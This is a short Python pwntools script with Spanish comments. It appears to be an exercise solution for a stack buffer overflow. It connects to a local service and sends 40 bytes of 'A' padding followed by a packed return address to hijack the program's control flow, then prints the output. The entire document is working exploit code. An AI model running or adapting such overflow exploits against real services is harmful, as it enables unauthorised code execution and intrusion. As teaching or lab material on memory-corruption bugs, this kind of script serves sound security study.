from pwn import *

# Crear una instacia de gdb con el programa.
io = remote('localhost', 41973)

#Enumeracion de tamaño y direccion
size = 40 #32 del buffer + 8 rbp 
address = p64(0x0000555555555ae9)

# Crear el payload con caracteres a desbordar
payload = b'A' * size
payload += address
# Mandar el payload al programa.
io.sendline(payload)

# Recibir el output del prorgrama.
output = io.recvall()

print(output)




